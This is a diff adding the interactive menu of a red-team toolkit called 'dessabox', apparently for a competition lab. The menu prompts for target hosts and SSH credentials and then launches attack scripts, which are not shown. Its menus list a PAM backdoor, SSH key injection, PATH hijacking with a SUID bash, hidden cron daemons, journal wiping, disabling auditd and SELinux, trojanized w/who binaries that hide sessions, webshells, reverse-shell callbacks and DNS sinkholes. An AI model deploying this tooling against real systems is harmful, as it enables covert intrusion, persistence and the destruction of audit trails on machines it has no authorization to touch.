+    d = f" [{default}]" if default else " (enter to skip)"
+    v = input(f"  {Y}{prompt}{d}: {NC}").strip()
+    return v if v else default
+
+def _yn(prompt, default=False, note=None):
+    if note:
+        print(f"  {B}    {note}{NC}")
+    hint = "Y/n" if default else "y/N"
+    v = input(f"  {Y}{prompt} [{hint}]: {NC}").strip().lower()
+    return v in ("y", "yes", "1") if v else default
+
+def _pick(title, items, back=True):
+    """
+    Numbered menu. items = [(label, desc), ...].
+    Returns (index, label), or (-1, None) for back, exits on q.
+    """
+    while True:
+        _clear()
+        banner()
+        _hdr(title)
+        for i, (lbl, desc) in enumerate(items, 1):
+            print(f"  {Y}{i:>2}.{NC}  {B}{lbl:<22}{NC} {desc}")
+        footer = f"\n   {Y}b.{NC}  back    {Y}q.{NC}  quit\n" if back else f"\n   {Y}q.{NC}  quit\n"
+        print(footer)
+        raw = input(f"  {C}> {NC}").strip().lower()
+        if raw == "q":  sys.exit(0)
+        if raw == "b" and back:  return -1, None
+        try:
+            idx = int(raw) - 1
+            if 0 <= idx < len(items):
+                return idx, items[idx][0]
+        except ValueError:
+            pass
+
+def _action(choices=("install", "remove", "status")):
+    _hdr("Action")
+    for i, c in enumerate(choices, 1):
+        print(f"  {Y}{i}.{NC}  {c}")
+    print()
+    while True:
+        raw = input(f"  {C}> {NC}").strip()
+        try:
+            idx = int(raw) - 1
+            if 0 <= idx < len(choices):
+                return choices[idx]
+        except ValueError:
+            if raw in choices:
+                return raw
+        print(f"  {R}  pick 1-{len(choices)}{NC}")
+
+def _confirm(lines):
+    """Print summary, return True to run, False to go back."""
+    _clear()
+    banner()
+    _hdr("Summary")
+    for l in lines:
+        print(f"  {l}")
+    print(f"\n  {G}r.{NC} run    {Y}b.{NC} back    {Y}q.{NC} quit\n")
+    while True:
+        raw = input(f"  {C}> {NC}").strip().lower()
+        if raw == "r":  return True
+        if raw == "b":  return False
+        if raw == "q":  sys.exit(0)
+
+def _pause():
+    input(f"\n  {Y}press enter to continue...{NC}")
+
+# ── target + connection prompt ─────────────────────────────────────────────────
+
+def _prompt_target():
+    """Prompt for target mode + SSH connection. Returns SimpleNamespace or None."""
+    mode_idx, _ = _pick("Target Mode", [
+        ("single",       "enter USER@HOST directly"),
+        ("named hosts",  "pick from the built-in host list"),
+        ("all hosts",    f"all {len(LINUX_HOSTS)} Linux hosts"),
+    ])
+    if mode_idx == -1:
+        return None
+
+    ns = _types.SimpleNamespace(
+        target=None, named_hosts=None, all_hosts=False,
+        user="root", ssh_pass="", identity="", port="22",
+        sudo_pass="", no_sudo=False, jobs=None, dry_run=False, verbose=False,
+    )
+
+    _clear(); banner()
+
+    if mode_idx == 0:
+        _hdr("Single Target")
+        ns.target = _ask("USER@HOST",
+            ex=["root@10.10.10.101", "ubuntu@10.10.10.103  (non-root, will sudo)"])
+
+    elif mode_idx == 1:
+        _hdr("Named Hosts  (enter space-separated numbers)")
+        host_list = list(LINUX_HOSTS.items())
+        for i, (name, ip) in enumerate(host_list, 1):
+            print(f"  {Y}{i:>2}.{NC}  {B}{name:<22}{NC} {ip}")
+        print(f"\n  {B}    e.g. 1          (just ftp)   |   1 3 5   (ftp + db + samba)   |   1-9 all{NC}\n")
+        while True:
+            raw = input(f"  {C}> {NC}").strip()
+            if not raw:
+                print(f"  {R}  select at least one{NC}"); continue
+            try:
+                idxs = [int(x) - 1 for x in raw.split()]
+                if all(0 <= i < len(host_list) for i in idxs):
+                    ns.named_hosts = [host_list[i][0] for i in idxs]
+                    break
+                print(f"  {R}  out of range{NC}")
+            except ValueError:
+                print(f"  {R}  numbers only{NC}")
+
+    else:
+        ns.all_hosts = True
+
+    _hdr("SSH Connection")
+    ns.user      = _opt("SSH user", "root",
+        ex="ubuntu  (if not already root; sudo will be used)")
+    ns.ssh_pass  = _opt("SSH password",
+        ex=["hunter2", "P@ssw0rd!  (leave blank to use key auth)"])
+    ns.identity  = _opt("SSH key file",
+        ex=["~/.ssh/id_ed25519", "~/.rt_keys/rt.key  (leave blank if using password)"])
+    ns.port      = _opt("SSH port", "22",
+        ex="2222  (non-standard port)")
+    ns.sudo_pass = _opt("Sudo password",
+        ex="leave blank to use same password as SSH login")
+    ns.no_sudo   = _yn("Skip sudo (already SSH'd as root)?", False,
+        note="set yes if you SSH'd directly as root (--no-sudo flag)")
+    if mode_idx > 0:
+        jobs_raw   = _opt("Parallel jobs", "9",
+            ex="4  (limit concurrency on slow networks)")
+        ns.jobs    = int(jobs_raw) if jobs_raw.isdigit() else None
+        ns.dry_run = _yn("Dry run?", False,
+            note="prints the mass-deploy command per host without executing it")
+    ns.verbose   = _yn("Verbose?", False,
+        note="shows the full remote bash command before it runs on each target")
+    return ns
+
+# ── deploy tool-specific prompt functions ──────────────────────────────────────
+
+def _dp_action_only(choices=("install", "remove", "status")):
+    return lambda: [_action(choices)]
+
+def _dp_ureadahead():
+    _hdr("ureadahead")
+    act = _action()
+    ta  = [act]
+    if act == "install":
+        key = _opt("SSH public key to inject",
+            ex="ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAA...  (your Kali pub key, injected into target's authorized_keys)")
+        if key: ta += ["--key", key]
+    return ta
+
+def _dp_path_hijack():
+    _hdr("path-hijack")
+    act = _action(("scan", "install"))
+    ta  = [act]
+    if act == "install":
+        _hdr("Level")
+        print(f"  {Y}1.{NC}  system   {B}    e.g. /etc/profile.d/ drop-in — affects all users + root interactive shells{NC}")
+        print(f"  {Y}2.{NC}  cron     {B}    e.g. injects into /etc/crontab PATH= line — fires inside root cron jobs{NC}")
+        print(f"  {Y}3.{NC}  (skip)   {B}    e.g. already set a level separately{NC}")
+        print()
+        raw = input(f"  {C}> {NC}").strip()
+        if raw == "1": ta += ["--level", "system"]
+        elif raw == "2": ta += ["--level", "cron"]
+
+        _hdr("Payload tier")
+        print(f"  {Y}1.{NC}  SSH key only    {B}    e.g. re-injects your pub key on every hijacked command run{NC}")
+        print(f"  {Y}2.{NC}  + SUID bash     {B}    e.g. also drops /var/cache/.syspkg/.bash -p for instant root{NC}")
+        print(f"  {Y}3.{NC}  + full chaos    {B}    e.g. also flushes firewall + restarts shadow-crond / ureadahead{NC}")
+        print(f"  {Y}4.{NC}  skip")
+        print()
+        raw = input(f"  {C}> {NC}").strip()
+        if raw in ("1", "2", "3"): ta += ["--payload", raw]
+
+        key  = _opt("SSH public key",
+            ex="ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAA...  (leave blank if not using key payload)")
+        cmds = _opt("Commands to wrap (comma-separated)",
+            ex="ls,cat,find,ps  (these get transparent wrappers that re-run payload on each call)")
+        if key:  ta += ["--key",      key]
+        if cmds: ta += ["--commands", cmds]
+    return ta
+
+def _dp_path_hijack_user():
+    _hdr("path-hijack-user")
+    act  = _action(("scan", "install"))
+    ta   = [act]
+    if act == "install":
+        key  = _opt("SSH public key",
+            ex="ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAA...  (injected into ~/.ssh/authorized_keys on each exec)")
+        cmds = _opt("Commands to wrap (comma-separated)",
+            ex="git,pip,python3  (user-level; ~/.local/bin wrappers, no root needed)")
+        if key:  ta += ["--key",      key]
+        if cmds: ta += ["--commands", cmds]
+    return ta
+
+def _dp_sinkhole():
+    _hdr("sinkhole")
+    act    = _action()
+    domain = _ask("Domain to sinkhole", "github.com",
+        ex=["github.com  (blocks all GitHub traffic + subdomains)", "apt.ubuntu.com  (blocks package updates)", "pypi.org  (blocks pip)"])
+    sip    = _opt("Sink IP", "127.0.0.1",
+        ex=["127.0.0.1   (loopback — connection refused)", "10.10.10.200  (your box — log + honey)"])
+    ta     = [act, domain]
+    if sip: ta.append(sip)
+    return ta
+
+def _dp_toucher():
+    _hdr("toucher")
+    root  = _opt("Start directory", "/",
+        ex=["/home      (target user dirs)", "/var/log   (flood audit trails)", "/etc       (maximum noise)"])
+    delay = _opt("Delay between touches (sec)", "0.1",
+        ex=["0.05  (fast — saturates inotify quickly)", "1.0   (slow — stays under the radar longer)"])
+    return [root or "/", delay or "0.1"]
+
+def _dp_infinite_users():
+    _hdr("infinite-users")
+    pw = _opt("Password for created users", "rt2025!delta",
+        ex="rt2025!delta  (default — or pick something less obvious like Str0ng_P@ss)")
+    return [pw] if pw else []
+
+# ── deploy tool registry ───────────────────────────────────────────────────────
+# (menu_label, description, rt_ssh_tool_name, prompt_fn)
+# rt_ssh_tool_name=None means special handling (madness)
+
+_DEPLOY_TOOLS = [
+    # persistence
+    ("shadow-cron",      "hidden 2nd cron daemon",                    "shadow-crond",      _dp_action_only()),
+    ("nuke-journal",     "Storage=none + wipe + LogLevelMax=0",       "nuke-journal",      _dp_action_only(("install","remove","status","wipe"))),
+    ("ureadahead",       "ureadahead service disguise",               "ureadahead-persist",_dp_ureadahead),
+    ("busybox",          "gate busybox behind token",                 "lock-busybox",      _dp_action_only()),
+    ("evil-timer",       "certbot.timer disguise (user, no sudo)",    "evil-timer",        _dp_action_only()),
+    ("poison-timer",     "firewall-flushing timer (root)",            "poison-timer",      _dp_action_only()),
+    ("pam",              "PAM backdoor - magic password",             "pam-backdoor",      _dp_action_only()),
+    ("vim",              "vim autocmd payload in every .vimrc",       "vim-persist",       _dp_action_only(("install","remove"))),
+    ("path-hijack",      "PATH injection wrappers (system/cron)",     "path-hijack",       _dp_path_hijack),
+    ("path-hijack-user", "PATH injection wrappers (user, no sudo)",   "path-hijack-user",  _dp_path_hijack_user),
+    # sabotage
+    ("no-apt",           "break apt package manager",                 "no-apt",            _dp_action_only()),
+    ("no-audit",         "kill auditd + shadow auditctl (one-shot)",  "no-audit",          lambda: []),
+    ("break-net",        "hobble curl / wget / git",                  "break-net-tools",   _dp_action_only()),
+    ("sudo-binary",      "replace sudo binary (one-shot)",            "sudo-binary",       lambda: []),
+    # chaos
+    ("compromise-who",   "trojanize w + who binaries",                "compromise-who",    _dp_action_only(("install","remove"))),
+    ("infinite-users",   "hijack nologin accounts for SSH access",     "infinite-users",    _dp_action_only()),
+    ("vandalize-bashrc", "vandalize all .bashrc files (one-shot)",    "vandalize-bashrc",  lambda: []),
+    ("alias-bashrc",     "inject aliases into all .bashrc",           "alias-bashrc",      _dp_action_only(("install","remove"))),
+    ("toucher",          "touch random files (floods inotify)",       "the-toucher",       _dp_toucher),
+    # network
+    ("sinkhole",         "DNS sinkhole for a domain",                 "sinkhole",          _dp_sinkhole),
+    ("pihole",           "Pi-hole sinkhole for GitHub (one-shot)",    "pihole-sinkhole",   lambda: []),
+    # meta
+    ("madness",          "pull latest + mass deploy everything",      None,                None),
+]
+
+_DEPLOY_INDEX = {t[0]: t for t in _DEPLOY_TOOLS}
+
+
+def _run_deploy_tool(name):
+    """Prompt + dispatch a single deploy tool by name."""
+    _, desc, rt_name, prompt_fn = _DEPLOY_INDEX[name]
+
+    if name == "madness":
+        if _confirm([f"{B}action:{NC}  pull latest from GitHub + mass-deploy everything"]):
+            print()
+            run(script("let-the-madness-begin.sh"))
+            _pause()
+        return
+
+    _clear(); banner()
+    _hdr(f"Configure: {name}")
+    tool_args = prompt_fn()
+    if tool_args is None:
+        return
+
+    ns = _prompt_target()
+    if ns is None:
+        return
+
+    tgt_str = (
+        ns.target if ns.target
+        else (", ".join(ns.named_hosts) if ns.named_hosts
+              else f"all {len(LINUX_HOSTS)} hosts")
+    )
+    auth_str = (
+        f"key: {ns.identity}" if ns.identity
+        else ("password" if ns.ssh_pass else "agent/default")
+    )
+    summary = [
+        f"{B}attack:{NC}   {name}  {' '.join(tool_args)}",
+        f"{B}rt-tool:{NC}  {rt_name}",
+        f"{B}targets:{NC}  {tgt_str}",
+        f"{B}user:{NC}     {ns.user}    auth: {auth_str}",
+    ]
+    if ns.no_sudo:  summary.append(f"{B}sudo:{NC}     disabled")
+    if ns.dry_run:  summary.append(f"{B}dry-run:{NC}  yes")
+
+    if _confirm(summary):
+        print()
+        _dispatch(ns, rt_name, tool_args)
+        _pause()
+
+
+# ── category menus ─────────────────────────────────────────────────────────────
+
+def menu_deploy():
+    items = [(t[0], t[1]) for t in _DEPLOY_TOOLS]
+    while True:
+        idx, name = _pick("Deploy", items)
+        if idx == -1:
+            return
+        _run_deploy_tool(name)
+
+
+def menu_persist():
+    items = [
+        ("linux",       "multi-method Linux persistence (SSH key, cron, systemd, SUID, rc)"),
+        ("ad",          "AD persistence - DCSync, golden ticket, backdoor DA, AdminSDHolder"),
+        ("redis",       "Redis RDB write -> SSH key + /etc/cron.d"),
+        ("ureadahead",  "ureadahead service disguise  [remote deploy]"),
+        ("shadow-cron", "hidden 2nd cron daemon        [remote deploy]"),
+        ("vim",         "vim autocmd payload           [remote deploy]"),
+        ("path-hijack", "PATH injection wrappers       [remote deploy]"),
+        ("evil-timer",  "certbot.timer disguise        [remote deploy]"),
+        ("pam",         "PAM backdoor                  [remote deploy]"),
+    ]
+    while True:
+        idx, name = _pick("Persist", items)
+        if idx == -1:
+            return
+        _clear(); banner()
+        if name == "linux":
+            _hdr("Linux Persistence")
+            ip     = _ask("Target IP",
+                ex=["10.10.10.101  (svc-ftp-01)", "10.10.10.103  (svc-database-01)"])
+            user   = _ask("SSH user",
+                ex=["root", "ubuntu  (will sudo for methods that need root)"])
+            passwd = _ask("SSH password",
+                ex="P@ssw0rd!  (the current login password for that user)")
+            lhost  = _opt("LHOST (your Kali IP — for reverse shell callback)",
+                ex="10.10.10.200  (leave blank to skip reverse shell methods)")
+            lport  = _opt("LPORT", "4444",
+                ex="4444  (nc -lvnp 4444 on Kali to catch the shell)") if lhost else ""
+            ta = [ip, user, passwd]
+            if lhost: ta += [lhost, lport]
+            if _confirm([
+                f"{B}target:{NC}   {ip}",
+                f"{B}user:{NC}     {user}",
+                f"{B}methods:{NC}  SSH key, cron, systemd, SUID bash, rc hook",
+            ]):
+                print(); run(script("persist/linux_persist.sh", *ta)); _pause()
+
+        elif name == "ad":
+            _hdr("AD Persistence")
+            dc    = _ask("DC IP",
+                ex="10.10.10.100  (Windows Server DC — check nmap/recon output)")
+            dom   = _ask("Domain",
+                ex=["corp.local", "cdtrt.local  (whatever the AD domain is)"])
+            admin = _ask("Admin user",
+                ex=["Administrator", "svc-admin  (any DA account you have creds for)"])
+            pw    = _ask("Admin password",
+                ex="P@ssw0rd!2025  (the DA's current password)")
+            lhost = _opt("LHOST",
+                ex="10.10.10.200  (your Kali IP — used for DNS record injection target)")
+            ta = [dc, dom, admin, pw]
+            if lhost: ta.append(lhost)
+            if _confirm([
+                f"{B}DC:{NC}       {dc}",
+                f"{B}domain:{NC}   {dom}",
+                f"{B}admin:{NC}    {admin}",
+                f"{B}methods:{NC}  DCSync, golden ticket, backdoor DA, AdminSDHolder, DNS record",
+            ]):
+                print(); run(script("persist/ad_persist.sh", *ta)); _pause()
+
+        elif name == "redis":
+            _hdr("Redis Persistence")
+            ip    = _ask("Target IP",
+                ex=["10.10.10.102  (svc-redis-01)", "10.10.10.103  (svc-database-01)"])
+            port  = _opt("Redis port", "6379",
+                ex="6379  (default Redis port — change if non-standard)")
+            rpw   = _opt("Redis password",
+                ex="foobared  (leave blank if Redis has no requirepass set)")
+            lhost = _opt("LHOST",
+                ex="10.10.10.200  (your Kali IP — used for the /etc/cron.d reverse shell)")
+            lport = _opt("LPORT", "4445",
+                ex="4445  (nc -lvnp 4445 on Kali)") if lhost else ""
+            ta = [ip, port]
+            if rpw:   ta.append(rpw)
+            if lhost: ta += [lhost, lport]
+            if _confirm([
+                f"{B}target:{NC}   {ip}:{port}",
+                f"{B}methods:{NC}  SSH key via RDB write, /etc/cron.d backdoor",
+            ]):
+                print(); run(script("persist/redis_persist.sh", *ta)); _pause()
+
+        else:
+            # remote deploy tools - hand off to deploy logic
+            _run_deploy_tool(name)
+
+
+def menu_sabotage():
+    items = [
+        ("net",     "hobble curl / wget / git (reversible)"),
+        ("apt",     "break apt package manager"),
+        ("audit",   "kill auditd + shadow auditctl (one-shot)"),
+        ("selinux", "disable SELinux + shadow setenforce/getenforce (one-shot)"),
+        ("sudo",    "replace sudo binary (one-shot)"),
+        ("busybox", "gate busybox behind a secret token"),
+        ("nuke-journal",  "Storage=none + wipe history + LogLevelMax=0 (nothing survives)"),
+    ]
+    while True:
+        idx, name = _pick("Sabotage", items)
+        if idx == -1:
+            return
+        _clear(); banner()
+        if name in ("net", "apt", "busybox", "nuke-journal"):
+            choices = ["install","remove","status","wipe"] if name == "nuke-journal" else ["install","remove","status"]
+            act = _action(choices)
+            script_map = {
+                "net":          ("break-net-tools.sh", True),
+                "apt":          ("no-apt.sh",          True),
+                "busybox":      ("lock-busybox.sh",     True),
+                "nuke-journal": ("nuke-journal.sh",     True),
+            }
+            spath, sudo = script_map[name]
+            if _confirm([f"{B}action:{NC} {name} {act}"]):
+                print(); run(script(spath, act, sudo=sudo)); _pause()
+        elif name == "audit":
+            if _confirm([f"{B}action:{NC} disable auditd + shadow auditctl (one-shot)"]):
+                print(); run(script("no-audit.sh", sudo=True)); _pause()
+        elif name == "selinux":
+            if _confirm([f"{B}action:{NC} set permissive + shadow setenforce/getenforce (one-shot)"]):
+                print(); run(script("no-selinux.sh", sudo=True)); _pause()
+        elif name == "sudo":
+            if _confirm([f"{B}action:{NC} replace sudo binary with broken copy"]):
+                print(); run(script("sudo-biNOry.sh", sudo=True)); _pause()
+
+
+def menu_webshell():
+    items = [
+        ("lamp",  "LAMP stack: SMB upload, SSH drop, log poisoning, PHPMyAdmin"),
+        ("flask", "Flask/Nginx/Redis: SSTI, Redis session forgery, off-by-slash, debug PIN"),
+    ]
+    while True:
+        idx, name = _pick("Webshell", items)
+        if idx == -1:
+            return
+        _clear(); banner()
+        if name == "lamp":
+            _hdr("LAMP Webshell")
+            ip    = _ask("Target IP",
+                ex="10.10.10.105  (svc-samba-01 — the LAMP host)")
+            smbu  = _opt("SMB user", "guest",
+                ex=["guest      (anonymous — try first)", "nobody", "samba-user  (if you have creds)"])
+            smbp  = _opt("SMB pass",
+                ex="leave blank for guest/anonymous  |  password  if you have creds")
+            wport = _opt("Web port", "80",
+                ex=["80   (standard HTTP)", "8080  (alt port — check nmap output)"])
+            ta = [ip, smbu or "guest", smbp, wport or "80"]
+            if _confirm([f"{B}target:{NC} {ip}:{wport}", f"{B}smb:{NC}    {smbu}"]):
+                print(); run(script("webshells/deploy_lamp_shell.sh", *ta)); _pause()
+        elif name == "flask":
+            _hdr("Flask/Nginx/Redis Webshell")
+            ip    = _ask("Target IP",
+                ex="10.10.10.102  (svc-redis-01 — Flask + Nginx + Redis host)")
+            wport = _opt("Web port", "80",
+                ex=["80    (nginx proxy to Flask)", "5000  (Flask direct if no nginx)"])
+            rport = _opt("Redis port", "6379",
+                ex="6379  (default Redis — needed for session forgery technique)")
+            lhost = _opt("LHOST",
+                ex="10.10.10.200  (your Kali IP — used for reverse shell via SSTI/RCE)")
+            lport = _opt("LPORT", "4447",
+                ex="4447  (nc -lvnp 4447 on Kali)") if lhost else ""
+            ta = [ip, wport or "80", rport or "6379"]
+            if lhost: ta += [lhost, lport]
+            if _confirm([f"{B}target:{NC} {ip}", f"{B}web:{NC}    port {wport}  redis: {rport}"]):
+                print(); run(script("webshells/deploy_nginx_flask_shell.sh", *ta)); _pause()
+
+
+def menu_net():
+    items = [
+        ("sinkhole", "dnsmasq DNS sinkhole - redirect queries for a domain"),
+        ("pihole",   "Pi-hole sinkhole for all GitHub-related domains"),
+    ]
+    while True:
+        idx, name = _pick("Network", items)
+        if idx == -1:
+            return
+        _clear(); banner()
+        if name == "sinkhole":
+            _hdr("DNS Sinkhole")
+            act    = _action()
+            domain = _ask("Domain", "github.com",
+                ex=["github.com      (blocks git clone, GitHub Actions, etc.)", "apt.ubuntu.com  (blocks apt updates)", "pypi.org        (blocks pip install)"])
+            sip    = _opt("Sink IP", "127.0.0.1",
+                ex=["127.0.0.1    (loopback — connection refused, silent fail)", "10.10.10.200  (your box — you can log + respond to hits)"])
+            ta = [act, domain, sip]
+            if _confirm([f"{B}action:{NC} {act}", f"{B}domain:{NC} {domain} -> {sip}"]):
+                print(); run(script("sinkhole-scripts.sh", *ta, sudo=True)); _pause()
+        elif name == "pihole":
+            if _confirm([f"{B}action:{NC} install Pi-hole + sinkhole all GitHub domains"]):
+                print(); run(script("pihole-github-sinkhole.sh", sudo=True)); _pause()
+
+
+def menu_chaos():
+    items = [
+        ("toucher",         "touch random files across the filesystem (floods inotify)"),
+        ("w-who",           "trojanize w + who - hide our sessions"),
+        ("dotify",          "prepend dots to every file in a directory (hide them)"),
+        ("users",           "create infinite nologin users (exhaust UID space)"),
+        ("fish",            "install fish shell + fish-user"),
+        ("alias-bashrc",    "inject aliases into every .bashrc"),
+        ("vandalize-bashrc","vandalize every .bashrc on the system"),
+    ]
+    while True:
+        idx, name = _pick("Chaos", items)
+        if idx == -1:
+            return
+        _clear(); banner()
+        if name == "toucher":
+            _hdr("Toucher")
+            root  = _opt("Start directory", "/",
+                ex=["/home      (hit user homedirs)", "/var/log   (thrash log dirs)", "/etc       (maximum noise across config files)"])
+            delay = _opt("Delay between touches (sec)", "0.1",
+                ex=["0.05  (aggressive — saturates inotify watches fast)", "0.5   (moderate)", "2.0   (slow + quiet — harder to detect)"])
+            if _confirm([f"{B}root:{NC} {root or '/'}  delay: {delay or '0.1'}s"]):
+                print(); run(script("the-toucher.sh", root or "/", delay or "0.1")); _pause()
+        elif name == "w-who":
+            if _confirm([f"{B}action:{NC} replace w + who with session-hiding wrappers",
+                         f"{B}effect:{NC} our TTYs disappear from w/who output — blue team can't see us logged in"]):
+                print(); run(script("compromise-w-who.sh", sudo=True)); _pause()
+        elif name == "dotify":
+            _hdr("Dotify")
+            d = _ask("Directory path",
+                ex=["/var/log/audit   (hide audit logs)", "/home/blueteam   (hide their files from themselves)", "/opt/monitoring  (hide monitoring scripts)"])
+            if _confirm([f"{B}dir:{NC} {d}",
+                         f"{B}effect:{NC} every file in that dir gets a dot prepended — hidden from ls by default"]):
+                print(); run(script("dotify.sh", d)); _pause()
+        elif name == "users":
+            _hdr("Infinite Users")
+            act = _action()
+            pw  = _opt("Password for accounts", "rt2025!delta",
+                ex="rt2025!delta  (default)  |  pick something that won't stand out in /etc/shadow") if act == "install" else ""
+            ta  = [act] + ([pw or "rt2025!delta"] if act == "install" and pw else [act])
+            if _confirm([f"{B}action:{NC}  {act} - hijack nologin service accounts for SSH access",
+                         f"{B}effect:{NC}  nologin -> bash, /etc/shells updated, full NOPASSWD sudo granted"]):
+                print(); run(script("infinite-users.sh", act, *([pw or "rt2025!delta"] if act == "install" else []), sudo=True)); _pause()
+        elif name == "fish":
+            if _confirm([f"{B}action:{NC} install fish shell + create fish-user"]):
+                print(); run(script("install-fish.sh", sudo=True)); _pause()
+        elif name == "alias-bashrc":
+            if _confirm([f"{B}action:{NC} inject aliases into every .bashrc on the system"]):
+                print(); run(script("alias-bashrc.sh", sudo=True)); _pause()
+        elif name == "vandalize-bashrc":
+            if _confirm([f"{B}action:{NC} vandalize every .bashrc on the system"]):
+                print(); run(script("vandalize-bashrc.sh", sudo=True)); _pause()
+
+
+def menu_info():
+    items = [
+        ("one-liners", "print the red-team one-liner reference sheet"),
+        ("tools",      "print the full tool -> script map"),
+    ]
+    while True:
+        idx, name = _pick("Info", items)
+        if idx == -1:
+            return
+        _clear(); banner()
+        if name == "one-liners":
+            run(script("one-liners.sh")); _pause()
+        elif name == "tools":
+            cmd_info(_types.SimpleNamespace(info_cmd="tools")); _pause()
+
+
+# ── main interactive loop ──────────────────────────────────────────────────────
+
+def menu_main():
+    _CAT = [
+        ("persist",   "persistence methods"),
+        ("deploy",    "deploy any attack to one or more targets"),
+        ("sabotage",  "break / neuter defensive tools"),
+        ("webshell",  "deploy webshells"),
+        ("net",       "DNS sinkholes"),
+        ("chaos",     "filesystem / user / shell chaos"),
+        ("info",      "one-liners + tool map"),
+    ]
+    while True:
+        idx, name = _pick("Main Menu", _CAT, back=False)  # no back at root
+        if   name == "persist":   menu_persist()
+        elif name == "deploy":    menu_deploy()
+        elif name == "sabotage":  menu_sabotage()
+        elif name == "webshell":  menu_webshell()
+        elif name == "net":       menu_net()
+        elif name == "chaos":     menu_chaos()
+        elif name == "info":      menu_info()
+
+
+# ─────────────────────────────────────────────────────────────────────────────
+# MAIN
+# ─────────────────────────────────────────────────────────────────────────────
+
+def main():
+    # No args -> interactive menu
+    if len(sys.argv) == 1:
+        try:
+            menu_main()
+        except KeyboardInterrupt:
+            print(f"\n\n  {Y}ctrl-c — bye{NC}\n")
+        sys.exit(0)
+
+    parser = argparse.ArgumentParser(
+        prog="dessabox",
+        description=f"{B}dessabox{NC} -odessa red team toolkit",
+        formatter_class=argparse.RawDescriptionHelpFormatter,
+        epilog=f"  Run {Y}dessabox info tools{NC} to see the full tool map.\n"
+               f"  Run {Y}dessabox <category> --help{NC} for subcommand details."
+    )
+    parser.add_argument("--no-banner", action="store_true", help="suppress banner")
+
+    subs = parser.add_subparsers(dest="category", metavar="CATEGORY")
+    add_persist(subs)
+    add_deploy(subs)
+    add_sabotage(subs)
+    add_webshell(subs)
+    add_net(subs)
+    add_chaos(subs)
+    add_info(subs)
+
+    args = parser.parse_args()
+
+    if args.category is None:
+        banner()
+        parser.print_help()
+        sys.exit(0)
+
+    if not hasattr(args, "func"):
+        parser.parse_args([args.category, "--help"])
+        sys.exit(1)
+
+    args.func(args)
+
+
+if __name__ == "__main__":
+    main()
